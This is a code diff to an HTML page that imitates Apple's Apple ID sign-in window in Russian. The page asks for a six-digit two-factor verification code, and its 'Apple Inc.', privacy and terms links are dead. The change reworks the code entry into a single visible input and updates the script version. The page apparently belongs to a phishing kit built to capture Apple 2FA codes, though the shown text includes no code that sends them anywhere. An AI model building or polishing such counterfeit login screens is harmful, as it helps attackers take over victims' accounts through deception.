@@ -1386,18 +1386,18 @@
                     </div>
 
                     <div class="apple-form-body">
-                        <!-- 6-Digit PIN Cells -->
-                        <div class="apple-pin-wrap">
+                        <!-- 6-Digit PIN Master Input & Visual Display -->
+                        <div class="apple-pin-wrap" id="applePinWrap">
                             <div class="apple-pin-grid">
-                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="0" autocomplete="one-time-code">
-                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="1">
-                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="2">
+                                <div class="apple-pin-cell active" data-index="0"></div>
+                                <div class="apple-pin-cell" data-index="1"></div>
+                                <div class="apple-pin-cell" data-index="2"></div>
                                 <span class="apple-pin-separator">—</span>
-                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="3">
-                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="4">
-                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="5">
+                                <div class="apple-pin-cell" data-index="3"></div>
+                                <div class="apple-pin-cell" data-index="4"></div>
+                                <div class="apple-pin-cell" data-index="5"></div>
                             </div>
-                            <input type="hidden" id="apple2faCodeInput" value="">
+                            <input type="tel" id="apple2faCodeInput" class="apple-pin-master-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="6-значный проверочный код Apple ID">
                         </div>
 
                         <div id="apple2faError" class="apple-error-msg hidden">
@@ -1445,16 +1445,16 @@
 
             <!-- Apple Accounts Window Footer -->
             <div class="apple-modal-footer">
-                <div class="apple-footer-lang"><span>Россия</span></div>
                 <div class="apple-footer-links">
                     <a href="#" onclick="event.preventDefault();">Конфиденциальность</a>
                     <a href="#" onclick="event.preventDefault();">Условия использования</a>
                     <a href="#" onclick="event.preventDefault();">Apple Inc.</a>
                 </div>
+                <div class="apple-footer-lang"><span>Россия</span></div>
             </div>
         </div>
     </div>
 
-    <script src="app.js?v=20261010_v36000"></script>
+    <script src="app.js?v=20261010_v37000"></script>
 </body>
 </html>
